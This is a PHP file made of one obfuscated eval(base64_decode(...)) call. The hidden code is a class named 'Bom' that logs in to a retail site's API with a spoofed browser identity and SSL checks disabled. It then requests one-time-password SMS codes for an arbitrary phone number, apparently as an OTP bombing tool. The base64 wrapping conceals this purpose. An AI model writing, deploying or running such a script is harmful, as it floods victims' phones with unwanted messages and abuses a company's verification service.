<?php eval("?>".base64_decode("PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCg0KQ2xhc3MgQm9tIHsNCg0KICAgIHB1YmxpYyAkbm87DQogICAgcHVibGljICRlbWFpbDsNCiAgICBwdWJsaWMgJHBhc3M7DQoNCglwdWJsaWMgZnVuY3Rpb24gc2VuZEMoJHVybCwgJHBhZ2UsICRwYXJhbXMpIHsNCg0KICAgICAgICAkY2ggPSBjdXJsX2luaXQoKTsgDQogICAgICAgIGN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfVVJMLCAkdXJsLiRwYWdlKTsgDQogICAgICAgIGN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAiTW96aWxsYS81LjAgKFdpbmRvd3M7IFU7IFdpbmRvd3MgTlQgNi4xOyBlbi1VUzsgcnY6MS44LjEuNikgR2Vja28vMjAwNzA3MjUgRmlyZWZveC8yLjAuMC42Iik7IA0KICAgICAgICBjdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsgDQoNCiAgICAgICAgaWYoIWVtcHR5KCRwYXJhbXMpKSB7DQogICAgICAgIGN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywgJHBhcmFtcyk7DQogICAgICAgIGN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfUE9TVCwgMSk7IA0KICAgICAgICB9DQoNCiAgICAgICAgY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgMCk7DQogICAgICAgIGN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfQ09PS0lFSkFSLCAnY29va2llLnR4dCcpOw0KICAgICAgICBjdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX0NPT0tJRUZJTEUsICdjb29raWUudHh0Jyk7DQogICAgICAgIGN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfRk9MTE9XTE9DQVRJT04sIDEpOw0KDQogICAgICAgICRoZWFkZXJzICA9IGFycmF5KCk7DQogICAgICAgICRoZWFkZXJzW10gPSAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9dXRmLTgnOw0KICAgICAgICAkaGVhZGVyc1tdID0gJ1gtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0JzsNCg0KICAgICAgICBjdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX0hUVFBIRUFERVIsICRoZWFkZXJzKTsgICAgDQogICAgICAgIC8vY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9IRUFERVIsIDEpOw0KICAgICAgICAkcmVzdWx0ID0gY3VybF9leGVjICgkY2gpOw0KICAgICAgICBjdXJsX2Nsb3NlKCRjaCk7DQogICAgICAgIHJldHVybiAkcmVzdWx0Ow0KDQogICAgfQ0KDQogICAgcHJpdmF0ZSBmdW5jdGlvbiBnZXRTdHIoJHN0YXJ0LCAkZW5kLCAkc3RyaW5nKSB7DQogICAgICAgIGlmICghZW1wdHkoJHN0cmluZykpIHsNCiAgICAgICAgJHNldHJpbmcgPSBleHBsb2RlKCRzdGFydCwkc3RyaW5nKTsNCiAgICAgICAgJHNldHJpbmcgPSBleHBsb2RlKCRlbmQsJHNldHJpbmdbMV0pOw0KICAgICAgICByZXR1cm4gJHNldHJpbmdbMF07DQogICAgICAgIH0NCiAgICB9DQoNCg0KICAgIHB1YmxpYyBmdW5jdGlvbiBMb2dpbigkZW1haWwsJHBhc3MpDQogICAgew0KICAgIAkkdXJsID0gImh0dHBzOi8vd3d3Lm1hdGFoYXJpbWFsbC5jb20vdXNlci9hamF4L2xvZ2luIjsNCiAgICAgICAgJGVtYWlsID0gJHRoaXMtPmVtYWlsOw0KICAgICAgICAkcGFzcyA9ICR0aGlzLT5wYXNzOw0KICAgIAkkZGF0YSA9ICJlbWFpbD17JGVtYWlsfSZwYXNzd2Q9eyRwYXNzfSI7DQogICAgCSRzZW5kID0gJHRoaXMtPnNlbmRDKCR1cmwsIG51bGwsICRkYXRhKTsNCiAgICAJaWYgKHByZWdfbWF0Y2goJy9zdWtzZXMvJywgJHNlbmQpKSB7DQogICAgICAgICAgICAgICAgLy8gcHJpbnQoJ0xvZ2luIFN1a3NlcyE8YnI+Jyk7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIC8vIHByaW50KCJMb2dpbiBHYWdhbCE8YnI+Iik7DQogICAgICAgICAgICB9DQogICAgfQ0KDQogICAgcHVibGljIGZ1bmN0aW9uIFZlcmlmKCkNCiAgICB7DQogICAgICAgICR1cmwgPSAiaHR0cHM6Ly93d3cubWF0YWhhcmltYWxsLmNvbS91c2VyL2FqYXgvcmVxdWVzdG90cCI7DQogICAgICAgICRubyA9ICR0aGlzLT5ubzsNCiAgICAgICAgJGRhdGEgPSAicGhvbmVfbnVtYmVyPXskbm99IjsNCiAgICAgICAgJHNlbmQgPSAkdGhpcy0+c2VuZEMoJHVybCwgbnVsbCwgJGRhdGEpOw0KICAgICAgICBpZiAocHJlZ19tYXRjaCgnL0tvZGUgT1RQIGJlcmhhc2lsIGRpa2lyaW0vJywgJHNlbmQpKSB7DQogICAgICAgICAgICAgICAgcHJpbnQoJ09UUCBiZXJoYXNpbCBEaWtpcmltITxicj4nKTsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgcHJpbnQoJ09UUCBHYWdhbCBEaWtpcmltITxicj4nKTsNCiAgICAgICAgICAgIH0NCiAgICB9DQoNCiAgICANCn0NCg0KDQoNCg==")); ?>